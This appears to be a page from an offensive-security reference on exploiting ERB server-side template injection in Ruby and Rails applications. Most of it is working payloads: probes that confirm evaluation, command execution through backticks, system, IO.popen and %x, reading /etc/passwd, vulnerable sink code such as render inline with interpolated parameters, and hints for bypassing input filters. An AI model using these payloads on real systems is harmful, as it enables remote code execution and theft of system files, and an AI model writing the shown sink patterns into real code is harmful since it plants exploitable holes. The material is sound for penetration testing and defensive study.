---
title: "ERB server-side template injection"
description: "Exploiting ERB SSTI: ERB evaluates embedded Ruby directly, so an injection is immediate command execution via backticks, system, or IO.popen, including the Rails render inline: sink."
keywords:
  - ERB SSTI
  - render inline
  - IO.popen
  - Ruby backticks
  - Erubi
---

# ERB

ERB evaluates Ruby inside `<%= expression %>` (output) and `<% statement %>` (no output) with no sandbox, so confirming the engine and achieving RCE are the same step. A reflected `<%= 7*7 %>` rendering `49` confirms evaluation; any of Ruby's command primitives then runs a shell command:

```erb
<%= `id` %>
<%= system('id') %>
<%= IO.popen('id').read %>
<%= %x(id) %>
```

Backticks and `%x{}` return the command output for display, `IO.popen(...).read` does the same, and `system` runs the command (returning true/false). For reading files without spawning a process, Ruby I/O is directly available:

```erb
<%= File.open('/etc/passwd').read %>
```

In Rails the usual sink is `render inline:` with interpolated user input, or an ERB template built from a parameter:

```ruby
render inline: "<%= #{params[:x]} %>"
ERB.new(params[:template]).result(binding)
```

Both compile attacker input as Ruby. Erubi (Rails' default since 5.1) and the older Erubis behave the same for exploitation; the tag syntax and direct evaluation are identical, so the payloads above carry over unchanged.

The precondition is that the input is treated as template source, not as a value passed to an existing template (which Rails escapes as data). Confirm the `<%= 7*7 %>` reflection, then use the backtick or `IO.popen` form to read output. Because there is no sandbox, the only obstacles are application-side input filters, bypassed with Ruby's many equivalents (`send`, `%x`, `Kernel.system`, `\u`-escaped strings).

## Tools

- tplmap, SSTImap

## References

- Ruby ERB documentation; Rails rendering guide (render inline:)
- PortSwigger Web Security Academy: Server-side template injection
